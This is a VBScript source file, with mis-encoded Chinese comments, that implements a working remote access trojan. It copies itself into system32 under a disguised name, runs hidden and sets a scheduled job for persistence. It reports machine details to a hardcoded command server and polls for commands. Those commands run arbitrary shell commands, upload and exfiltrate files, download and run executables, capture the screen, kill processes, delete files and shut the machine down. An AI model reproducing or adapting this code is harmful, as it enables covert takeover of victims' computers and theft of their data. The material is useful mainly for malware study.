on Error Resume Next  '�ݴ�ģʽ
'/////////////////////////////////////////////////////////////////////
'///////////////////////// �趨 �������� /////////////////////////////
'/////////////////////////////////////////////////////////////////////
Dim SysReg,FullFileName,FullNewsName,sysStage

     FullFileName = lcase(WScript.ScriptFullName)
     FullNewsName = lcase("c:\windows\system32\systen32.vbs")
if FullFileName<>FullNewsName then
 Set fso=Wscript.CreateObject("Scripting.FileSystemObject")
 Set c=fso.getfile(FullFileName)   '������λ��
     c.copy(FullNewsName)          '������
 Set c=nothing
 Set fso=nothing
 
 
 Wscript.sleep 1000
 Set objShell=wscript.createObject("wscript.shell") 
     objShell.Run FullNewsName,0
 Set objShell=Nothing


 Wscript.sleep 1000
'/// д��ƻ�
Set objWMIService = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
Set objNewJob   = objWMIService.Get("Win32_ScheduledJob")
  errJobCreated = objNewJob.Create(FullNewsName,"********200000.000000+480",True ,1 OR 2 OR 4 OR 8 OR 16 Or 32 OR 64,,,JobID)
Select Case errJobCreated
       Case 0    State = "�ɹ����"
       Case 1    State = "��֧��"
       Case 2    State = "���ʱ��ܾ�"
       Case 8    State = "���ֲ�������"
       Case 9    State = "δ����·��"
       Case 21   State = "������Ч"
       Case 22   State = "������δ����"
       Case Else State = "״̬δ֪"
End Select
Set objNewJob   = nothing
Set objWMIService = nothing
 
'/// д��ע���
' Set SysReg       = Wscript.CreateObject("wscript.shell")
'     SysReg.RegWrite "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\RemoteVbs[Cm.Ivan]",FullNewsName
' Set SysReg       = nothing
 
 sysStage="false"
end if









     '////// ��ȡmac /////
     Dim mc,mo
     Set mc=GetObject("Winmgmts:").InstancesOf("Win32_NetworkAdapterConfiguration")
     For Each mo In mc
         If mo.IPEnabled=True Then
             mac=mo.MacAddress
             Exit For
         End If
     Next
     Set mc=noting
	 

     '////// ��������� /////
     Dim WshNetwork,Host
     Set WshNetwork   = WScript.CreateObject("WScript.Network")
         Host = WshNetwork.ComputerName 'ȡ�����������
     Set WshNetwork   =noting
	 

     '////// ��ȡ�̷� /////
     Dim Fsys,coldisks,eDisk,disks
     Set Fsys=WScript.CreateObject("Scripting.FileSystemObject") 
     Set coldisks = Fsys.Drives 
         For Each eDisk in coldisks 
             If eDisk.Drivetype=2 then
                disks=disks&eDisk&"|"
             End If
         next
     Set coldisks =Nothing
     Set Fsys     =Nothing 
	 


'--------------------------------------------------------------------
'/////////////////// �г������̷�           /////////////////////////
'--------------------------------------------------------------------
Function gethost()
     on Error Resume Next  '�ݴ�ģʽ
	 if disks<>"" then Call BackCmd("host")
End Function


'--------------------------------------------------------------------
'/////////////////// Url����ת��           //////////////////////////
'--------------------------------------------------------------------
Function URLEncoding(vstrIn) 
     on Error Resume Next  '�ݴ�ģʽ(��ֹ�ڴ治��)
     strReturn = "" 
     For i = 1 To Len(vstrIn) 
         ThisChr = Mid(vStrIn,i,1) 
         If Abs(Asc(ThisChr)) < &HFF Then 
            strReturn = strReturn & ThisChr 
         Else 
            innerCode = Asc(ThisChr) 
            If innerCode < 0 Then 
               innerCode = innerCode + &H10000 
            End If 
            Hight8 = (innerCode And &HFF00)\ &HFF 
            Low8   = innerCode  And &HFF 
            strReturn = strReturn & "%" & Hex(Hight8) & "%" & Hex(Low8) 
         End If 
     Next 
     URLEncoding = strReturn 
End Function
'--------------------------------------------------------------------
'///////////////// �ύ���ݵ�������        //////////////////////////
'--------------------------------------------------------------------
Function BackCmd(Cmdstr)
     on Error Resume Next  '�ݴ�ģʽ(��ֹ�ڴ治��)
     Dim xmlhttp,xmlget,bgpos,endpos
	     Cmdstr=replace(Cmdstr," ","%20")
         Cmdstr=replace(Cmdstr,"&","%26")
		 Cmdstr=replace(Cmdstr,chr(13),"{-}")
		 
     Set xmlhttp = CreateObject("Msxml2.ServerXMLHTTP") 
	     strA=URLEncoding("cmd="&Cmdstr&"&mac="&mac&"&host="&host&"&disk="&disks)
     With xmlhttp
         .Open "POST",UrlTarget&"/server.asp",False
         .SetRequestHeader "Content-Length",len(strA)
         .SetRequestHeader "CONTENT-TYPE","application/x-www-form-urlencoded"
         .Send strA
      If .status<>200 then xmlget="error"
     End With 
     Set xmlhttp = Nothing
End Function
'--------------------------------------------------------------------
'//////////////// ���ַ�תΪָ�����룬��ֹ���� //////////////////////
'--------------------------------------------------------------------
Function BytesToBstr(body)
     on Error Resume Next  '�ݴ�ģʽ(��ֹ�ڴ治��)
     Dim ObjStream
     Set ObjStream=CreateObject("adodb.stream") 
         ObjStream.Type = 1
         ObjStream.Mode = 3 
         ObjStream.Open 
         ObjStream.Write body 
         ObjStream.Position = 0 
         ObjStream.Type = 2 
        'ObjStream.CharSet = "UTF-8"     '��ֹ����
         ObjStream.CharSet = "gb2312"    '��ֹ����
         BytesToBstr=ObjStream.ReadText  
         ObjStream.Close 
     Set ObjStream=Nothing
End Function 


'--------------------------------------------------------------------
'//////////////// ��ָ���ļ�����//////////////////////
'--------------------------------------------------------------------
Function getBytes(path)
     on Error Resume Next  '�ݴ�ģʽ(��ֹ�ڴ治��)
  Dim objXMLHTTP
  Dim objADOStream
  Set objADOStream = CreateObject("ADODB.Stream")   
      objADOStream.Open   
      objADOStream.Type = 1   
      objADOStream.LoadFromFile path  
      getBytes = objADOStream.Read()
  Set objADOStream = nothing
End Function 




'--------------------------------------------------------------------
'//////////////// ��ȡ��ҳ������  ///////////////////////////////////
'--------------------------------------------------------------------
Function GetHttpPage(Url)
     On Error Resume Next  '�ݴ�ģʽ(��ֹ�ڴ治��)
     Dim xmlhttp,xmlget,bgpos,endpos
     Set xmlhttp = CreateObject("Msxml2.ServerXMLHTTP") 
	     strA=""
         With xmlhttp
           .Open "GET",Url,False
           .SetRequestHeader "Content-Length",len(strA)
           .SetRequestHeader "CONTENT-TYPE","application/x-www-form-urlencoded"
           .SEnd strA
           If .status<>200 then
              GetHttpPage="error"
           Else
	          GetHttpPage=BytesToBstr(xmlhttp.responseBody)
           End If
         End With 
 Set xmlhttp = Nothing
End Function 
'--------------------------------------------------------------------
'///////// �����ļ���Сת��             //////////////////////////////
'--------------------------------------------------------------------
Function FormatSize(SZ)
     On Error Resume Next  '�ݴ�ģʽ
     Dim i,Unit4Size
     Unit4Size="�ֽ�KBMBGB"
     if SZ<>"" and isnumeric(SZ) then
        Do While SZ>1024 and err=0
	       if len(SZ)>=10 then
              i =3
		      A_SZ=left(SZ,len(SZ)-4)
              SZ =A_SZ \ 1024 *100
            else
              i =i+1
              SZ=int(SZ) \ 1024
		   end if
        Loop
        FormatSize=SZ&" "&mid(Unit4Size,1+2*i,2)
     end if
End Function





'--------------------------------------------------------------------
'//////////////// ���ַ�תΪָ�����룬��ֹ���� //////////////////////
'--------------------------------------------------------------------
Public Function BytesToBstr(body)
     On Error Resume Next  '�ݴ�ģʽ(��ֹ�ڴ治��)
     Dim ObjStream
     Set ObjStream = CreateObject("adodb.stream")
         ObjStream.Type = 1
         ObjStream.Mode = 3
         ObjStream.Open
         ObjStream.Write body
         ObjStream.Position = 0
         ObjStream.Type = 2
         ObjStream.Charset = "gb2312"    '��ֹ����
         BytesToBstr = ObjStream.ReadText
         ObjStream.Close
     Set ObjStream = Nothing
End Function

'--------------------------------------------------------------------
'//////////////// ���ַ�תΪָ�����룬��ֹ���� //////////////////////
'--------------------------------------------------------------------
Public Function StringToBytes(ByVal strData)
  On Error Resume Next
    Dim objFile
    Set objFile = CreateObject("ADODB.Stream")
        objFile.Type = 2
        objFile.Charset = "gb2312"
        objFile.Open
        objFile.WriteText strData
        objFile.Position = 0
        objFile.Type = 1
        StringToBytes = objFile.Read(-1)
        objFile.Close
    Set objFile = Nothing
End Function

'------------------------------------------------------
'//////////////// ��ָ���ļ�����//////////////////////
'------------------------------------------------------
Public Function GetBytes(ByVal Path)
  On Error Resume Next
  Dim objFile
  Set objFile = CreateObject("ADODB.Stream")
      objFile.Type = 1
      objFile.Open
      objFile.LoadFromFile Path
      GetBytes = objFile.Read(-1)
      objFile.Close
  Set objFile = Nothing
End Function


'------------------------------------------------------
'//////////////// �ϴ�ָ���ļ�   //////////////////////
'------------------------------------------------------
Public Function UpFiles(ByVal Path)
  On Error Resume Next
  Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP")
  Set objTemp = CreateObject("ADODB.Stream")
      objTemp.Type = 1
      objTemp.Open
    
      tmp = tmp & vbCrLf & "filename=""" & Path & """" & vbCrLf
      tmp = tmp & "Content-Disposition: form-data;name=""upload"";filename=""" & Path & """" & vbCrLf & vbCrLf
     
      objTemp.Write StringToBytes(tmp)
   If VarType(vtValue) = (vbByte Or vbArray) Then
      objTemp.Write "" & Path & ""
   Else
      objTemp.Write GetBytes("" & Path & "")
   End If
      objTemp.Position = 0
      xmlHttp.Open "POST", UrlTarget & "/vbsUpload.asp", False
      xmlHttp.setRequestHeader "Content-Type", "multipart/form-data"
      xmlHttp.setRequestHeader "Content-Length", objTemp.Size
      xmlHttp.Send objTemp
    
      If xmlHttp.Status <> 200 Then
         BackPageInfo = "error"
      Else
         BackPageInfo = BytesToBstr(xmlHttp.responseBody)
      End If
      UpFiles = BackPageInfo
    objTemp.Close
  Set objTemp = Nothing
  Set xmlHttp = Nothing
End Function


'------------------------------------------------------
'//////////////// ����ָ���ļ�   //////////////////////
'------------------------------------------------------
Public Function DownFiles(ByVal GetFile,ByVal ToFile)
  On Error Resume Next
  Set xmlhttp = CreateObject("Microsoft.XMLHTTP") '����HTTP�������
  Set stream  = CreateObject("ADODB.Stream")      '����ADO����������
  '--------------| ���ǲ�ɱ |-----------------
      xmlhttp.open "GET",GetFile,False  '������
      xmlhttp.send()                    '��������
      stream.mode = 3     '����������Ϊ��дģʽ
      stream.type = 1     '����������Ϊ������ģʽ
      stream.open()       '��������
      stream.write(xmlhttp.responsebody)  '���������ķ��ر�����������д��������
      stream.savetofile ToFile,2          '������������Ϊ�ļ�
  '-------------------------------------------
      DownFiles=true
  Set xmlhttp = Nothing
  Set stream  = Nothing
End Function



'--------------------------------------------------------------------
'///////// ����ѭ����⣬��ִ��         //////////////////////////////
'--------------------------------------------------------------------
Function loopRun()
     On Error Resume Next  '�ݴ�ģʽ
           Dim GetCmd
           GetCmd=GetHttpPage(UrlTarget&"/cmd.txt")  '��������

		   If GetCmd<>"" then
		      GetCmds = split(GetCmd,"|")
		     If cstr(GetCmds(0))=cstr(mac) or cstr(GetCmds(0))=cstr("ToAll") then     '��֤MAC
			 
		     If ubound(GetCmds)>=1 then     '��֤�Ƿ����
select case lcase(GetCmds(1))

  '---------------------------------------------------
  '--------------| ϵͳ���� |------------------------->
  '---------------------------------------------------

	   '>>>>>>>>>>>>>>>> �г�ϵͳ�ļ�/Ŀ¼
	   case "sys_dir"
             Path=GetCmds(2)
             If len(Path)>3 then
	            If right(Path,1)="\" then Path=left(Path,len(Path)-1)
             ElseIf len(Path)=2 then
	            Path=Path&"\"
             End If
			 
             Dim i,TempStr,FlSpace
             Set objFso = CreateObject("Scripting.FileSystemObject")
             Set CrntFolder = objFso.GetFolder(Path)

                 TreeStr="folder|"
             For Each SubFolder In CrntFolder.SubFolders
                 'If ShowSize Then TreeStr = TreeStr & FormatSize(SubFolder.size)
	             TreeStr = TreeStr &"|"& SubFolder.Name
             Next

	             TreeStr=TreeStr&"{#}file|"
             For Each ConFile In CrntFolder.Files
                 TreeStr = TreeStr &"|"& ConFile.Name&"{s}"
	             TreeStr = TreeStr & FormatSize(ConFile.Size)
             Next
			 BackCmdStr=TreeStr
			 
			 
			 
	   '>>>>>>>>>>>>>>>> ע��/����ϵͳ/�ػ�
	   case "sys_shutdown_0","sys_shutdown_2","sys_shutdown_8" 
	         Dim  shutdown_Id  
	         shutdown_Id=int(right(GetCmds(1),1))
			 Set colOperatingSystems = GetObject("winmgmts:{(Shutdown)}").ExecQuery("Select * from Win32_OperatingSystem") 
		         For Each objOperatingSystem in colOperatingSystems 
 		             ObjOperatingSystem.Win32Shutdown(shutdown_Id) 
		         Next
			 Set colOperatingSystems=Nothing
	   '>>>>>>>>>>>>>>>> ����cmd ����
	   case "sys_cmd"
	         '--- ִ������
			 Set objShell=wscript.createObject("wscript.shell") 
 		         objShell.Run "cmd.exe /c "&GetCmds(2)&" >c:\windows\syscmd~.txt",0
		     Set objShell=Nothing
			 '--- ��ȡ��ʱ�ļ�
			     wscript.sleep 1000
             Set objFSO = Wscript.CreateObject("Scripting.FileSystemObject") 
                 Set objCountFile = objFSO.OpenTextFile("c:\windows\syscmd~.txt",1,True)
                     if not objCountFile.AtEndofStream then 
                        FSOFileRead = objCountFile.Readall
                     end if
                     objCountFile.Close 
                 Set objCountFile=Nothing 
             Set objFSO = Nothing
			 
			 GetCmds(1)="sys_txt"        'ǿ���޸ķ�����Ϣ����������Ϣ��ʾ
			 BackCmdStr=">> (C) ��Ȩ���� 1985-2001 Microsoft Corp. "&chr(13)&FSOFileRead
			 
			 
			 
	   '>>>>>>>>>>>>>>>> �г�ϵͳ����
	   case "sys_tasklist"    
			 Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
			 Set process=wmi.execquery("select * from win32_process")
			 for each objprocess in process
			     objProcess.GetOwner UserName,strUserDomain
      			 All_PID=All_PID&"{list}"&objprocess.ExecutablePath&"*"&objprocess.name&"*"
				 All_PID=All_PID&UserName&"*"&objprocess.processid
  			 next
			 Set wmi = Nothing
			 Set process = Nothing
			 BackCmdStr  = All_PID
			 
			 
			 
	   '>>>>>>>>>>>>>>>> �ر�ϵͳ����
	   case "sys_killtask"  
		     C_cmds=split(GetCmds(2),"|")
			 C_Name="-"
			 For i=0 to ubound(C_cmds)
                 C_Name=C_Name&" or processid='"&C_cmds(i)&"'"
			 Next
		         C_Name=replace(C_Name,"- or","") 
             Dim Bag1,pipe1
             Set Bag1=getobject("winmgmts:\\.\root\cimv2")
             Set pipe1=Bag1.execquery("select * from win32_process where"&C_Name)
                 For Each i in pipe1
                     i.terminate()
                 Next
			 Set pipe1=Nothing
			 Set Bag1 =Nothing
			 GetCmds(1)="sys_txt"        'ǿ���޸ķ�����Ϣ������ʾ��Ϣ��ʾ
			 BackCmdStr="�ɹ����� ����PID: "&GetCmds(2)&" ��"
			 
			 
			 
	   '>>>>>>>>>>>>>>>> ��ȡ��Ļ
	   case "sys_getscreen"  
             '----- ��ȡ�ļ� ----
			 set fso = CreateObject("scripting.filesystemobject")
                 if fso.FileExists("sysscreen.exe") then
                    '�ļ�����,��ִ��
                 else
                    '�ļ�������,������
					call DownFiles(UrlTarget&"/getscreen.exe","sysscreen.exe")  '//�����ļ�
                 end if
             set fso = nothing
             '----- ִ���ļ� ----
			 set fso = CreateObject("scripting.filesystemobject")
                 if fso.FileExists("sysscreen.exe") then
 			        Set objShell=wscript.createObject("wscript.shell") 
 		                objShell.Run "sysscreen.exe",0
		            Set objShell=Nothing
                 else
                    runscreen=false
                 end if
             set fso = nothing
			 call UpFiles("screen.jpg")
			 
			GetCmds(1)="sys_txt"
			BackCmdStr="�ѳɹ���ͼ"
			 
			 

			 
			 
			 
	   '>>>>>>>>>>>>>>>> �½��ļ�(���������)
	   case "sys_newfile"  
             GetFile = GetCmds(2)                        '�����ϵ��ļ���ַ
             GetFiles=split(GetFile,"/")
             ToFile  =GetFiles(ubound(GetFiles))         '����ɵı����ļ�
                          
	                  ToFile=replace(ToFile," ","")
			 if ToFile="" then
			    ToFile="hongya2012.htm"
				else
				if instr(ToFile,".")<>0 then
				   ToFile  =replace(ToFile,".","_.")
				   else
				   ToFile  =ToFile&"_.htm"
				end if
			 end if
             ToFile="C:\WINDOWS\system32\"&ToFile
                
			 
			 call DownFiles(GetFile,ToFile)  '//�����ļ�
			 
			 GetCmds(1)  = "sys_txt"     'ǿ���޸ķ�����Ϣ������ʾ��Ϣ��ʾ
			 BackCmdStr  = "�ɹ��½��ļ�: "&ToFile&" ��"
			 
			 
	   '>>>>>>>>>>>>>>>> ע���༭(���ӵ�)
	   case "sys_reg"  
	         Set MainUrl=CreateObject("wscript.shell")
	         	 RegPath="HKEY_CURRENT_USER\SOFTWARE\Microsoft\Internet Explorer\Main\Window Title"
  	             Tf=MainUrl.regwrite(RegPath,"[�׿�.�й�]")
	         Set MainUrl=nothing 
			 

  '---------------------------------------------------
  '--------------| �������� |------------------------->
  '---------------------------------------------------
  
	   '>>>>>>>>>>>>>>>> ����ҳ
	   case "sys_openweb" 
	         Set objShell = CreateObject("Wscript.Shell") 
	             objShell.Run(GetCmds(2)) 
			 Set objShell = Nothing
			 
			 GetCmds(1)="sys_txt"     'ǿ���޸ķ�����Ϣ������ʾ��Ϣ��ʾ
			 BackCmdStr="�ɹ�����ҳ: "&GetCmds(2)&" ��"
			 
			 
	   '>>>>>>>>>>>>>>>> ������Ϣ
	   case "sys_showmsg" 
	         msgbox GetCmds(2)
			 GetCmds(1)="sys_txt"     'ǿ���޸ķ�����Ϣ������ʾ��Ϣ��ʾ
			 BackCmdStr="�ɹ�������Ϣ: "&GetCmds(2)&" ��"
			 
			 
	   '>>>>>>>>>>>>>>>> ����
	   case "sys_windowblack" 
	         set ie=wscript.createobject("internetexplorer.application")
   	             ie.navigate "about:blank"
    	         ie.fullscreen=1
    	         ie.statusbar =0 
    	         ie.document.bgColor="black"
    	         ie.document.fgColor="White"
    	         ie.document.body.scroll="no"
    	         ie.visible=1 
    	         Randomize
	         Set ObjDiv=ie.document.createElement("div")
	         Set ObjDoc=ie.document.body
    	         ObjDoc.appendChild ObjDiv
	             With ObjDiv
       	             .style.position="absolute"
         	           .style.left=rnd*ObjDoc.clientWidth
          	          .style.top =rnd*ObjDoc.clientHeight
          	          .style.width    = "auto"
          	          .style.fontsize = "20px"
		  	          .innerHTML      = GetCmds(2)
    	         End With
	         Set ObjDoc=nothing
	         Set ObjDiv=nothing
			 GetCmds(1)="sys_txt"     'ǿ���޸ķ�����Ϣ�����ı���Ϣ��ʾ
			 BackCmdStr="������Ϣ: "&GetCmds(2)&" ��"


  '---------------------------------------------------				
  '--------------| �ļ����� |------------------------->
  '---------------------------------------------------
  
	   '>>>>>>>>>>>>>>>> ��ȡ�ļ�
	   case "file_read"
	        dim file_read
			    file_read = UpFiles(GetCmds(2))
            GetCmds(1)="sys_txt"
			BackCmdStr="�ļ�:"&GetCmds(2)&file_read
			 
			 
			 
			 
	   '>>>>>>>>>>>>>>>> �����ļ�
	   case "file_copy"
	         fcopys=split(GetCmds(2),"{_}")
			 if ubound(fcopys)=1 then
	            Set fso=Wscript.CreateObject("Scripting.FileSystemObject")
	            Set c=fso.getfile(fcopys(0))   '������λ��
   	                c.copy(fcopys(1))          '������
	            Set c=nothing
	            Set fso=nothing
			 end if
			 GetCmds(1)="sys_txt"
			 BackCmdStr="�Ѹ����ļ�:"&GetCmds(2)
			 
			 
	   '>>>>>>>>>>>>>>>> �������ļ�
	   case "file_rename" 
	         frenames=split(GetCmds(2),"{_}")
			 if ubound(frenames)=1 then
                Set fso=Wscript.CreateObject("Scripting.FileSystemObject")
	            Set c=fso.getfile(frenames(0))   'Ҫ���������ļ�
   	                c.name=frenames(1)           '������
	            Set c=nothing
	            Set fso=nothing
		     GetCmds(1)="sys_txt"
		     BackCmdStr="���������ļ�:"&GetCmds(2)
			 end if


	   '>>>>>>>>>>>>>>>> �޸��ļ�����
	   case "file_attrib"
	         'Fso.GetFile(Fname) 
	         'Fso.GetFolder(Fname)
			 'A.attributes=A.attributes+2+4  '�������
			 '1-ֻ��;2-����;4-ϵͳ
	         attribs=split(GetCmds(1),"{_}")
			 if ubound(attribs)=1 then
	            Set objFSO  = CreateObject("Scripting.FileSystemObject") 
	            Set objFile = objFSO.GetFile(attribs(0)) 
	                objFile.Attributes = objFile.Attributes&attribs(1)
			    Set objFile =nothing
			    Set objFSO  =nothing
			 end if

	   '>>>>>>>>>>>>>>>> ɾ���ļ�
	   case "file_del"
	         Set fso=createobject("scripting.filesystemobject") 
  	             fso.deleteFile GetCmds(2)
				 GetCmds(1)="sys_txt"
				 BackCmdStr="��ɾ���ļ�:"&GetCmds(2)
	         Set fso=nothing
			 
	   '>>>>>>>>>>>>>>>> ִ���ļ�
	   case "file_run"
			 Set objShell=wscript.createObject("wscript.shell") 
 		         objShell.Run GetCmds(2),0
				 GetCmds(1)="sys_txt"
				 BackCmdStr="�������ļ�:"&GetCmds(2)
		     Set objShell=Nothing
			 
			 
End select

'----------------|  �ύ��������  |-----------------
      If BackCmdStr<>"" and err=0 Then
	     Call BackCmd(GetCmds(1)&"{#}"&BackCmdStr)
	   else
	     Call BackCmd("sys_txt{#}ָ�����ִ��ʧ�ܣ�")
      End If
'---------------------------------------------------

		     End If
			 End If
		   End If
		   
		   
		 gethost()                '��ʼ��
		 Wscript.Sleep 1000
         loopRun()                'ѭ��ִ��
End Function


	
	
'----------------|  ѭ��ִ�У�֪����ȡ����ַΪֹ  |-----------------
Function getAddress(url)
    on Error Resume Next  '�ݴ�ģʽ
    t_getAddress=GetHttpPage(url)
    if t_getAddress<>"" and len(t_getAddress)>12 then
       if right(t_getAddress,1)="/" then t_getAddress=left(t_getAddress,len(t_getAddress)-1)
	     getAddress=t_getAddress     'ע��:��ַ���治�ü�"/"
	else
	     getAddress=""
    end if
End Function





'--------------------------------------------------------------------
'/////////////////// ��������,���ú���   ////////////////////////////
'--------------------------------------------------------------------
Dim UrlTarget,getSite   'ȫ�ֱ�����Ŀ���ַ
    UrlTarget=""
    Urlconfig="http://www.zc62.com/old/up/cmivan/vbs/config.asp" 

if FullFileName=FullNewsName then

  '��ȡָ����ַ
do while UrlTarget=""
   UrlTarget=getAddress(Urlconfig)
   UrlTarget=replace(UrlTarget,chr(10),"")
   UrlTarget=replace(UrlTarget,chr(13),"")
   Wscript.sleep 2000
loop
if UrlTarget<>"" then
   Call loopRun()        'ѭ��ִ��
end if

end if
